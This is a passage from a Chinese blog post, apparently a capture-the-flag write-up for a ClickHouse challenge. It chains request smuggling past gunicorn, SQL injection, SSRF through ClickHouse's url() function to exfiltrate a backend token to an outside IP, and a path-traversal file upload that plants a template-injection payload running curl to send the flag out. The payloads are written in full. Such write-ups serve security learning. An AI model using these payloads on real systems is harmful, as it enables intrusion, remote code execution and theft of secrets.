+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/yDIMgXltVLNfslVGg9lt4g">https://mp.weixin.qq.com/s/yDIMgXltVLNfslVGg9lt4g</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/CHYbeta/OddProxyDemo/blob/master/nginx/demo1/README.md">https://github.com/CHYbeta/OddProxyDemo/blob/master/nginx/demo1/README.md</a></p>
+<p>首先需要知道什么是gunicorn 直接拷打gpt</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707369999289-a775c507-85fa-496d-9374-37e6658e0fbf.png" alt="img"></p>
+<p>payload：<code>POST /query	HTTP/1.1/../../api/ping HTTP/1.1</code></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707370146347-676e2ecc-fe64-4993-bc27-baa9d5f44346.png" alt="img"></p>
+<p>发现query路由下存在sql注入，不过这里不是mysql了，而是clickhouse数据库</p>
+<p>接下来是ssrf</p>
+<p>查阅官方文档发现有个url函数<a target="_blank" rel="noopener" href="https://clickhouse.com/docs/zh/sql-reference/table-functions/url">https://clickhouse.com/docs/zh/sql-reference/table-functions/url</a></p>
+<p>发送post请求上传文件需要insert，这里没法进行堆叠注入</p>
+<p>clickhouse自己有个HTTP Interface 通过它可以实现GET请求insert语句</p>
+<p>先ssrf自身的HTTP interface然后再去ssrf到backend<a target="_blank" rel="noopener" href="https://clickhouse.com/docs/zh/interfaces/http">https://clickhouse.com/docs/zh/interfaces/http</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> url(<span class="string">&#x27;http://default:default@db:8123/?query=&lt;SQL&gt;&#x27;</span>, <span class="string">&#x27;TabSeparatedRaw&#x27;</span>, <span class="string">&#x27;x String&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p><code>TabSeparatedRaw</code>表示返回的数据采用制表符分隔的原始数据格式</p>
+<p><code>x String</code>表示外部查询返回的数据类型为字符串</p>
+<p>接下里的思路就是先select拿到token然后套一个url函数将token编码后外带</p>
+<p>接着insert发送post请求上传文件到backend</p>
+<p>index留了POST方法用于渲染其他模板 就可以通过路径穿越将文件上传至templates目录然后 render这个模板 实现SSTI</p>
+<h2 id="拿token"><a href="#拿token" class="headerlink" title="拿token"></a>拿token</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span> AND (SELECT * FROM <span class="title function_">url</span><span class="params">(<span class="string">&#x27;http://124.221.177.174:6666/?a=&#x27;</span>||hex((select * FROM url(<span class="string">&#x27;http://backend:8001/api/token&#x27;</span>, <span class="string">&#x27;TabSeparatedRaw&#x27;</span>, <span class="string">&#x27;x String&#x27;</span>)</span>)), <span class="string">&#x27;TabSeparatedRaw&#x27;</span>, <span class="string">&#x27;x String&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707376834751-532d80ef-7f64-407e-b1cb-0a02b632e546.png" alt="img"></p>
+<p>拿到token：<code>38ad6332afaa1e3fc75f6a6b60cdd909</code></p>
+<h2 id="insert上传文件"><a href="#insert上传文件" class="headerlink" title="insert上传文件"></a>insert上传文件</h2><p>payload:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span> and (select * from <span class="title function_">url</span><span class="params">(<span class="string">&#x27;http://172.16.106.1:8123/?query=insert into function url(&#x27;</span>http://backend:<span class="number">8001</span>/api/upload<span class="string">&#x27;,&#x27;</span>TabSeparatedRaw<span class="string">&#x27;, &#x27;</span>a String<span class="string">&#x27;,headers(&#x27;</span>Content-Type<span class="string">&#x27;=&#x27;</span>multipart/form-data; boundary=----test<span class="string">&#x27;,&#x27;</span>X-Access-Token<span class="string">&#x27;=&#x27;</span>38ad6332afaa1e3fc75f6a6b60cdd909<span class="string">&#x27;)) Values(&#x27;</span> ------test\r\nContent-Disposition: form-data; name=<span class="string">&quot;myfile&quot;</span>; filename=<span class="string">&quot;../templates/exp.html&quot;</span>\r\nContent-Type: text/plain\r\n\r\n$code:\r\n	__import__(\<span class="string">&#x27;os\&#x27;).system(\&#x27;curl http://124.221.177.174:7777/?flag=`/readflag | base64`\&#x27;)\r\n------test--&#x27;</span>)</span>;<span class="string">&#x27;,CSV,&#x27;</span>a String<span class="string">&#x27;))</span></span><br></pre></td></tr></table></figure>
+
+<p>内容是最简洁的上传一个文件的请求头和请求体</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707381987765-4e279843-4651-4623-9841-cefbcfc80f1d.png" alt="img"></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707379693762-a99cbe8a-b338-4536-8eb6-deed6aa0d94b.png" alt="img"></p>
+<p>可见我们的文件已经被上传了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707379874775-1c1c6f97-3ae0-4d60-8ef0-7c94077970c6.png" alt="img"></p>
+<p>这里需要注意的是后端接受表单的名称为myfile而不是file，还有就是根据给的附件nginx.conf上传upload时候nginx反向代理location内网端口为8001</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707380679253-5f329d9f-1471-4ea2-a0af-a5d2bfe7c93c.png" alt="img"></p>
+<p>接着到index render test.html实现RCE</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707380332237-2d15b9a6-f885-44ab-9f3e-12e79705204b.png" alt="img"></p>
+<p>拿到flag</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707380341369-b800c902-c363-4399-8a25-01209b02088f.png" alt="img"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>做X1r0z师傅出的题总能学到不少知识，而且赛后还给复现环境的dockerfile，很难不爱！！</p>
+<p>看官方文档的能力真的很重要，基本功同样重要！！！</p>
+<p>java继续探索！</p>
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a target="_blank" rel="noopener" href="https://exp10it.io/2023/12/nctf-2023-web-official-writeup/#logging">https://exp10it.io/2023/12/nctf-2023-web-official-writeup/#logging</a></p>
+<p>[<a target="_blank" rel="noopener" href="https://boogipop.com/2023/12/28/NCTF%202023%20Web%20Writeup(Post-Match)/#house-of-click]">https://boogipop.com/2023/12/28/NCTF%202023%20Web%20Writeup(Post-Match)/#house-of-click]</a>(<a target="_blank" rel="noopener" href="https://boogipop.com/2023/12/28/NCTF">https://boogipop.com/2023/12/28/NCTF</a> 2023 Web Writeup(Post-Match)&#x2F;#house-of-click)</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13536?time__1311=mqmxnQiQi=FqlxGgpDyeXvB+DIOxGwD&alichlgref=https://xz.aliyun.com/t/13536#toc-4">https://xz.aliyun.com/t/13536?time__1311=mqmxnQiQi%3DFqlxGgpDyeXvB%2BDIOxGwD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F13536#toc-4</a></p>
+
+                    </article>
+                    
+
+
+    <blockquote id="date-expire-notification" class="post-expired-notify">本文最后更新于 <span id="date-expire-num"></span> 天前，文中所描述的信息可能已发生改变</blockquote>
+    <script>
+    (function() {
+        var dateUpdate = Date.parse("2024-02-08");
+        var nowDate = new Date();
+        var a = nowDate.getTime();
+        var b = a - dateUpdate;
+        var daysUpdateExpire = Math.floor(b/(24*3600*1000));
+        if (daysUpdateExpire >= 120) {
+            document.getElementById('date-expire-num').innerHTML = daysUpdateExpire;
+        } else {
+            document.getElementById('date-expire-notification').style.display = 'none';
+        }
+    })();
+    </script>
+
+
+<p class="post-footer-info mb-0 pt-0">本文发表于&nbsp;<time datetime="2024-02-08T08:51:48.000Z" itemprop="datePublished">2024-02-08</time>
+
+</p>
+<p class="post-footer-info mb-0 pt-2">
+
+<span class="post-categories-list mt-2">
+
+<a class="post-categories-list-item" href='/categories/%E5%90%84%E8%B5%9B%E4%BA%8BWP/'>各赛事WP</a>
+
+</span>
+
+
+
+
+</p>
+
+                </div>
+                <div class="post-nav px-2 bg-gray">
+<ul class="pagination">
+    <!-- Prev Nav -->
+    
+
+    <!-- Next Nav -->
+    
+        <li class="page-item page-next">
+            <a href="/post/c4db13dc.html" rel="next">
+                <div class="page-item-title"><i class="icon icon-forward" aria-hidden="true"></i></div>
+                <div class="page-item-subtitle">第六届安洵杯WEB赛后解题</div>
+            </a>
+        </li>
+    
+</ul>
+</div>
+
+                
+                    <!-- # Comment # -->
+                    
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+            <!-- ### Footer ### -->
+            <footer class="text-center">
+    <!-- footer copyright -->
+    
+        <p class="footer-copyright mb-0">Copyright&nbsp;©&nbsp;<span id="copyright-year"></span>
+            <a class="footer-copyright-a" href="https://z1d10t.fun">Z1d10tのBlog</a>
+        </p>
+
+    <!-- footer custom text -->
+    <p class="footer-text mb-0">
+    
+    </p>
+    <!-- footer develop info -->
+    <p class="footer-develop mb-0">
+        
+
+        
+        Powered by&nbsp;<!--
+         --><a href="https://hexo.io" target="_blank" class="footer-develop-a" rel="external nofollow noopener noreferrer">Hexo</a><span class="footer-develop-divider"></span>Theme&nbsp;-&nbsp;<!--
+         --><a href="https://github.com/SukkaW/hexo-theme-suka" target="_blank" class="footer-develop-a" rel="external noopener">Suka</a>
+    </p>
+</footer>
+
+
+        <!-- ### Import File ### -->
+        <!-- ### Footer JS Import ### -->
+
+<script>
+
+    
+window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 50
+};
+document.getElementById('copyright-year').textContent = new Date().getFullYear();
+console.log('\n %c Suka Theme (hexo-theme-suka) | © SukkaW | Verision 1.3.3 %c https://github.com/SukkaW/hexo-theme-suka \n', 'color: #fff; background: #444; padding:5px 0;', 'background: #bbb; padding:5px 0;');
+
+</script>
+
+<script src="/lib/vanilla-lazyload/lazyload.min.js" async></script>
+
+
+
+<!-- Comment -->
+
+
+<!-- ### Custom Footer ### -->
+
+    </body>
+
+</html>
